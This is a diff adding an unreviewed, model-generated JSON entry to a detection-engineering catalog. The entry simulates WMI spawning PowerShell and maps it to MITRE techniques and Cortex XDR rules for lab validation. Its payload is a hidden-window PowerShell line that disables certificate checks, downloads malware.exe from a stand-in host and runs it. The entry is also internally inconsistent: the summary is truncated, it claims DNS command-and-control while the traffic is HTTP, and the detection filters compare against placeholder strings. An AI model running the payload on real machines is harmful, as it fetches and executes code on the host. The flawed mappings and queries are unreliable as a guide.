@@ -1,0 +1,193 @@
+{
+  "id": "TTP-0000-0309",
+  "schema_version": "1.0.0",
+  "entry_version": "0.1.0",
+  "status": "draft",
+  "metadata": {
+    "created_at": "2026-11-12T00:00:00Z",
+    "updated_at": "2026-11-12T00:00:00Z",
+    "authors": [
+      {
+        "name": "detdev pipeline (local model, unreviewed)",
+        "role": "generator"
+      }
+    ],
+    "tags": [
+      "generated-draft",
+      "platform-windows",
+      "endpoint",
+      "cortex-analytics-alert"
+    ],
+    "pov_engine": {
+      "auto_load": false,
+      "simulation_class": "endpoint",
+      "destructive": false,
+      "platforms": [
+        "windows"
+      ],
+      "cleanup_required": true,
+      "safety_class": "lab-only"
+    }
+  },
+  "identity": {
+    "name": "WMI Execution via WmiPrvSe.exe with Rare Child Command Line",
+    "summary": "An attacker uses WmiPrvSe.exe to execute a WMI command with a rare child command line, which triggers the Cortex alert 'WmiPrvSe.exe Rare Child Command Line'. The attack involves executing a PowerShel",
+    "description": "An attacker uses WmiPrvSe.exe to execute a WMI command with a rare child command line, which triggers the Cortex alert 'WmiPrvSe.exe Rare Child Command Line'. The attack involves executing a PowerShell command through WMI to download and execute a payload."
+  },
+  "mitre_attack": {
+    "matrix": "enterprise",
+    "techniques": [
+      {
+        "technique_id": "T1047",
+        "name": "Windows Management Instrumentation",
+        "tactic_ids": [
+          "TA0002"
+        ],
+        "tactic_names": [
+          "Execution"
+        ]
+      },
+      {
+        "technique_id": "T1059",
+        "subtechnique_id": "T1059.001",
+        "name": "Command and Scripting Interpreter: PowerShell",
+        "tactic_ids": [
+          "TA0002"
+        ],
+        "tactic_names": [
+          "Execution"
+        ]
+      },
+      {
+        "technique_id": "T1071",
+        "subtechnique_id": "T1071.004",
+        "name": "Application Layer Protocol: DNS",
+        "tactic_ids": [
+          "TA0011"
+        ],
+        "tactic_names": [
+          "Command and Control"
+        ]
+      }
+    ]
+  },
+  "execution": {
+    "target_platform": "windows",
+    "execution_framework": "custom-cortex",
+    "privilege_required": "administrator",
+    "payload": {
+      "interpreter": "powershell",
+      "code": "powershell.exe -WindowStyle Hidden -Command \"[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; $client = New-Object System.Net.WebClient; $client.Proxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy(); $client.DownloadFile('http://192.0.2.10/malware.exe', 'C:\\Windows\\Temp\\malware.exe'); Start-Process -FilePath 'C:\\Windows\\Temp\\malware.exe'\"\n",
+      "input_variables": [],
+      "timeout_seconds": 120
+    },
+    "expected_artifacts": [
+      {
+        "artifact_type": "process",
+        "description": "WmiPrvSe.exe process spawning a PowerShell child process with suspicious command line",
+        "expected_value": "actor_process_image_name = 'WmiPrvSe.exe' and action_process_image_name = 'powershell.exe' and action_command_line contains 'WindowStyle Hidden'"
+      },
+      {
+        "artifact_type": "network-connection",
+        "description": "Outbound network connection to C2 server",
+        "expected_value": "action_remote_ip = '192.0.2.10' and dst_port = 80"
+      },
+      {
+        "artifact_type": "file",
+        "description": "Downloaded malware file",
+        "expected_value": "action_file_path = 'C:\\Windows\\Temp\\malware.exe'"
+      }
+    ],
+    "cleanup": {
+      "manual_steps": [
+        "Not authored. Write and test cleanup before promotion."
+      ]
+    }
+  },
+  "detections": {
+    "biocs": [
+      {
+        "name": "WmiPrvSe.exe Rare Child Command Line",
+        "description": "Detection of WmiPrvSe.exe spawning a child process with an uncommon command line pattern",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter actor_process_image_name = 'WmiPrvSe.exe'\n| filter action_command_line not in ['\\'powershell.exe -EncodedCommand ...\\'', '\\'cmd.exe /c ...\\'']\n| filter action_command_line contains 'WindowStyle Hidden'",
+        "mitre_technique_ids": [
+          "T1047",
+          "T1059.001"
+        ],
+        "severity": "high",
+        "suppression_window_seconds": 0
+      }
+    ],
+    "abiocs": [
+      {
+        "name": "WmiPrvSe.exe Unusual PowerShell Execution",
+        "description": "Detection of WmiPrvSe.exe executing PowerShell with unusual command line parameters",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter actor_process_image_name = 'WmiPrvSe.exe'\n| filter action_process_image_name = 'powershell.exe'\n| filter action_command_line contains 'WindowStyle Hidden'\n| filter action_command_line not in ['\\'powershell.exe -EncodedCommand ...\\'', '\\'cmd.exe /c ...\\'']",
+        "behavioral_profile": "machine-learning",
+        "causality_anchor": "WmiPrvSe.exe process spawning",
+        "mitre_technique_ids": [
+          "T1047",
+          "T1059.001"
+        ],
+        "severity": "high"
+      }
+    ],
+    "xql_queries": [
+      {
+        "purpose": "validation",
+        "name": "WMI PowerShell Execution Hunt",
+        "query": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter actor_process_image_name = 'WmiPrvSe.exe'\n| filter action_process_image_name = 'powershell.exe'\n| filter action_command_line contains 'WindowStyle Hidden'\n| filter action_command_line not in ['\\'powershell.exe -EncodedCommand ...\\'', '\\'cmd.exe /c ...\\'']",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      }
+    ],
+    "correlation_rules": [],
+    "iocs": [],
+    "analytics_modules": [
+      "Cortex XSIAM Analytics (XDR Agent) — WmiPrvSe.exe Rare Child Command Line; Required Data: XDR Agent. Ref: https://cortex-docs.paloaltonetworks.com/analytics-alerts/alerts-by-name/wmiprvse-exe-rare-child-command-line"
+    ]
+  },
+  "panw_mapping": {
+    "products": [
+      {
+        "module": "cortex-xdr",
+        "submodule": "analytics",
+        "coverage_tier": "detection"
+      }
+    ]
+  },
+  "references": [
+    {
+      "title": "Cortex XDR Analytics Alert Reference: WmiPrvSe.exe Rare Child Command Line",
+      "url": "https://cortex-docs.paloaltonetworks.com/analytics-alerts/alerts-by-name/wmiprvse-exe-rare-child-command-line",
+      "publisher": "Palo Alto Networks",
+      "primary": true
+    },
+    {
+      "title": "MITRE ATT&CK T1047",
+      "url": "https://attack.mitre.org/techniques/T1047/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1059.001",
+      "url": "https://attack.mitre.org/techniques/T1059/001/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1071.004",
+      "url": "https://attack.mitre.org/techniques/T1071/004/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    }
+  ],
+  "changelog": [
+    {
+      "entry_version": "0.1.0",
+      "date": "2026-11-12",
+      "author": "detdev pipeline (local model, unreviewed)",
+      "change": "Generated draft. Built from the model fragment and its recorded source only; not reviewed, not run."
+    }
+  ]
+}
